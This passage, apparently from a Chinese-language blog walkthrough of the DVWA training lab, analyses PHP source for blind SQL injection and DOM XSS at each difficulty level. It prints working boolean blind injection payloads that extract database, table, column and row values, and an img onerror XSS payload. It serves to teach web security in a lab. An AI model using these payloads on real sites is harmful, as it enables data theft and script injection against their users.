class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>文本框输入并提交的形式，get方式，未作任何输入过滤和限制，攻击者可以任意构造想输入的sql查询，对没有进行任何检查、过滤、返回参数只有两种<br>第一步猜闭合方式<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-14-03.png" alt="闭合方式" class="lazyload"><br>猜测为字符型<br>第二步猜解数据库名(以数据库名的第一个字母为例)(最终可以查到数据库名root)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1&#x27; and (select ascii(substr(database(),1,1)) &gt; 111) #<br>1&#x27; and (select ascii(substr(database(),1,1)) &gt; 120) #<br>1&#x27; and (select ascii(substr(database(),1,1)) &gt; 115) #<br>1&#x27; and (select ascii(substr(database(),1,1)) &gt; 113) #<br>1&#x27; and (select ascii(substr(database(),1,1)) = 114) #<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-16-57.png" alt="猜解" class="lazyload"><br>原理通过名字的ascill码来匹配是否正确正确返回正确信息错误返回错误信息<br>第三步查表名和查库名一样依旧是利用猜解来查最终查到为guestbook(以数据库的第一个表的第一个字母为例)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) &gt; 101) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) &gt; 110) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) &gt; 105) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) &gt; 103) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) &gt; 102) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) = 103) #<br><br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-20-55.png" alt="猜解表名" class="lazyload"></p>
<p>第四步猜解字段名方法一样(以数据库中第一个表第一个字段第一个字母为例)最终可以查到字段名为comment_id</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &gt; 101) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 101) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 90) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 95) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 98) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 99) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 100) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) = 99) #<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-24-17.png" alt="猜解字段名" class="lazyload"><br>第五步猜解第一个表第一个字段的第一个数据的第一个字母最终查到数据1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 101) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 50) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 30) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 40) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 45) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 48) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) = 49) #<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-27-38.png" alt="值的获取" class="lazyload"><br>剩余的数据都一样都是通过这种方式来查找</p>
<p><strong>Medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">//这里使用mysqli_real_escape_string()函数对一些符号进行了转义</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_DVWA</span>[<span class="hljs-string">&#x27;SQLI_DB&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-variable">$id</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$id</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>            <span class="hljs-comment">// Check database</span><br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span><br><br>            <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> !== <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-variable">$exists</span> = (mysqli_num_rows( <span class="hljs-variable">$result</span> ) &gt; <span class="hljs-number">0</span>); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors</span><br>                &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            <br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SQLITE:<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$sqlite_db_connection</span>;<br>            <br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-variable">$results</span> = <span class="hljs-variable">$sqlite_db_connection</span>-&gt;query(<span class="hljs-variable">$query</span>);<br>                <span class="hljs-variable">$row</span> = <span class="hljs-variable">$results</span>-&gt;fetchArray();<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-variable">$row</span> !== <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$exists</span>) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>中级难度下，提交方式变为下拉id提交，使用post提交，并且使用mysqli_real_escape_string函数对单引号双引号反斜杠等进行了转义处理。和low的普通方式差不多但需要抓包构造语句使用post提交<br>四种语句还是类似并且和low的过程相似。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1 #<br>1 and (select ascii(substr(database(),1,1)) = 114) #<br>1 and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) = 103) #<br>1 and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) = 99) #<br>1 and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) = 49) #<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-59-30.png" alt="测试" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_COOKIE</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_COOKIE</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_DVWA</span>[<span class="hljs-string">&#x27;SQLI_DB&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-comment">// Check database limit限制只能查一条数据</span><br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span><br><br>            <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> !== <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-comment">// Get results</span><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-variable">$exists</span> = (mysqli_num_rows( <span class="hljs-variable">$result</span> ) &gt; <span class="hljs-number">0</span>); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors</span><br>                &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br><br>            ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SQLITE:<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$sqlite_db_connection</span>;<br><br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-variable">$results</span> = <span class="hljs-variable">$sqlite_db_connection</span>-&gt;query(<span class="hljs-variable">$query</span>);<br>                <span class="hljs-variable">$row</span> = <span class="hljs-variable">$results</span>-&gt;fetchArray();<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-variable">$row</span> !== <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$exists</span>) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Might sleep a random amount 报错的话会执行延迟函数</span><br>        <span class="hljs-keyword">if</span>( rand( <span class="hljs-number">0</span>, <span class="hljs-number">5</span> ) == <span class="hljs-number">3</span> ) &#123;<br>            sleep( rand( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );<br>        &#125;<br><br>        <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span><br>        header( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>high级别的盲注加入了sleep函数对时间盲注造成干扰，将数据提交页面和结果显示也页面分离，一定程度上约束了sqlmap自动化工具的常规方式但无法完全阻挡，利用set-cookie对输入的值进行传递到显示页面的cookie字段中保存，sql语句添加limit限制每次输出只有结果的一个记录，不会输出所有纪录。</p>
<p>漏洞复现：<br>对于limit限制输出记录数目可以利用#注释限制，服务端会随机执行sleep函数，做执行延迟时间2-4秒会对时间延迟盲注有干扰，因此可以考虑布尔盲注测试<br>可以参考low级别的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1&#x27; #<br>1&#x27; and (select ascii(substr(database(),1,1)) = 114) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) = 103) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) = 99) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) = 49) #<br></code></pre></td></tr></table></figure>

<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token 加入token机制</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br>    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Was a number entered? 对传入的id进行判断是否为数字 并且使用了limit 1做了限制 使用了PDO</span><br>    <span class="hljs-keyword">if</span>(is_numeric( <span class="hljs-variable">$id</span> )) &#123;<br>        <span class="hljs-variable">$id</span> = intval (<span class="hljs-variable">$id</span>);<br>        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_DVWA</span>[<span class="hljs-string">&#x27;SQLI_DB&#x27;</span>]) &#123;<br>            <span class="hljs-keyword">case</span> MYSQL:<br>                <span class="hljs-comment">// Check the database</span><br>                <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<br>                <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::PARAM_INT );<br>                <span class="hljs-variable">$data</span>-&gt;execute();<br><br>                <span class="hljs-variable">$exists</span> = <span class="hljs-variable">$data</span>-&gt;rowCount();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> SQLITE:<br>                <span class="hljs-keyword">global</span> <span class="hljs-variable">$sqlite_db_connection</span>;<br><br>                <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$sqlite_db_connection</span>-&gt;prepare(<span class="hljs-string">&#x27;SELECT COUNT(first_name) AS numrows FROM users WHERE user_id = :id LIMIT 1;&#x27;</span> );<br>                <span class="hljs-variable">$stmt</span>-&gt;bindValue(<span class="hljs-string">&#x27;:id&#x27;</span>,<span class="hljs-variable">$id</span>,SQLITE3_INTEGER);<br>                <span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;execute();<br>                <span class="hljs-variable">$result</span>-&gt;finalize();<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> !== <span class="hljs-literal">false</span>) &#123;<br>                    <span class="hljs-comment">// There is no way to get the number of rows returned</span><br>                    <span class="hljs-comment">// This checks the number of columns (not rows) just</span><br>                    <span class="hljs-comment">// as a precaution, but it won&#x27;t stop someone dumping</span><br>                    <span class="hljs-comment">// multiple rows and viewing them one at a time.</span><br><br>                    <span class="hljs-variable">$num_columns</span> = <span class="hljs-variable">$result</span>-&gt;numColumns();<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num_columns</span> == <span class="hljs-number">1</span>) &#123;<br>                        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetchArray();<br><br>                        <span class="hljs-variable">$numrows</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;numrows&#x27;</span> ];<br>                        <span class="hljs-variable">$exists</span> = (<span class="hljs-variable">$numrows</span> == <span class="hljs-number">1</span>);<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$exists</span>) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span><br>        header( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这个级别采用了PDO技术划清了代码于数据的界限有效的提高了防御sql注入，加入了token机制进一步提高了安全性，采用参数化查询而非动态查询，对代码和数据进行了分离。只有返回的查询结果数量为一个记录时才会成功输出，有效预防了暴库，使用is_numeric函数来判断是否为数字满足条件才查询。</p>
<h2 id="DVWA-–-XSS-DOM"><a href="#DVWA-–-XSS-DOM" class="headerlink" title="DVWA – XSS(DOM)"></a>DVWA – XSS(DOM)</h2><p>XSS全程跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意脚本代码当受害者访问该页面恶意代码就会在浏览器上执行，需要强点的是，xss不仅限于JavaScript，还包括flash等其他脚本语言，根据恶意代码是否存储在服务器中又分为存储型和反射型。<br>DOM——base XSS漏洞基于文档对象模型的一种漏洞。dom是一个与平台编程语言无关的接口，它允许程序或脚本动态访问和更新文档内容，结构和样式，处理后的结果能作为页面的一部分。dom中有很多对象，其中一些可以用户操作如url、location、refelter等。客户端脚本程序可以通过dom动态修改页面内容，不依赖于提交数据到服务器，而是从客户端获得数据在本地执行，如果dom中的数据没有经过严格确认就会产生dom型xss漏洞</p>
<p>可能触发dom型xss的属性：document.referer属性、window.name属性、location属性、innerhtml属性、document.write属性</p>
<p>XSS(dom)主题:<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-11-55-06.png" alt="dom型xss" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>没有保护，什么都没有<br><span class="hljs-comment"># No protections, anything goes</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>直接进行弹窗测<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-11-58-27.png" alt="弹窗" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">array_key_exists()检查键是否存在</span><br><span class="hljs-comment">array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。</span><br><span class="hljs-comment">提示：如果指定数组的时候省略了键名，将会生成从 0 开始并以 1 递增的整数键名</span><br><span class="hljs-comment">array_key_exists(key,array)</span><br><span class="hljs-comment">key 必需    规定键名。</span><br><span class="hljs-comment">array    必需。规定数组</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> ( array_key_exists( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !is_null (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>];<br>    <br>    <span class="hljs-comment"># Do not allow script tags </span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    stripos函数查找字符串在另一字符串中第一次出现的位置不区分大小写</span><br><span class="hljs-comment">    stripos(string,find,start)</span><br><span class="hljs-comment">    string 必需    规定被搜索的字符串。</span><br><span class="hljs-comment">    find 必需    规定要查找的字符。</span><br><span class="hljs-comment">    start 可选    规定开始搜索的位置。</span><br><span class="hljs-comment">    返回值：    返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释：字符串位置从 0 开始，不是从 1 开始。</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">//如果不含script</span><br>    <span class="hljs-keyword">if</span> (stripos (<span class="hljs-variable">$default</span>, <span class="hljs-string">&quot;&lt;script&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        header (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    header() 函数向客户端发送原始的 HTTP 报头</span><br><span class="hljs-comment">    header(string,replace,http_response_code)</span><br><span class="hljs-comment">    string 必需    规定要发送的报头字符串。</span><br><span class="hljs-comment">    replace 可选    指示该报头是否替换之前的报头，或添加第二个报头。</span><br><span class="hljs-comment">    默认是 true（替换）。false（允许相同类型的多个报头）。</span><br><span class="hljs-comment">    http_response_code可选    把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>简单的说就是过滤了&lt;script,当匹配到时就会修正参数为English<br>在这里可以构造onerror事件，在装载文档或图像的过程中如果发生错误就会触发事件构造语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">English&lt;/option&gt;&lt;select&gt;&lt;img src=x onerror=alert(1)&gt;<br></code></pre></td></tr></table></figure>

<p>这里的option标签是通过网页源码拼接的<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-08-15.png" alt="标签的选择" class="lazyload"><br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-09-38.png" alt="成功弹窗" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?php<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( array_key_exists( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !is_null (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br><br>    <span class="hljs-comment"># White list the allowable languages这里设置了百名单只允许这些值通过</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;French&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;English&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;German&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Spanish&quot;</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            header (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里设置了白名单但只对default进行了过滤我们可以用&amp;或者#,在url中#表示书签&amp;表示指定参数之间的分隔符。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-22-25.png" alt="添加标签或者添加参数" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># Don&#x27;t need to do anything, protection handled on the client side</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

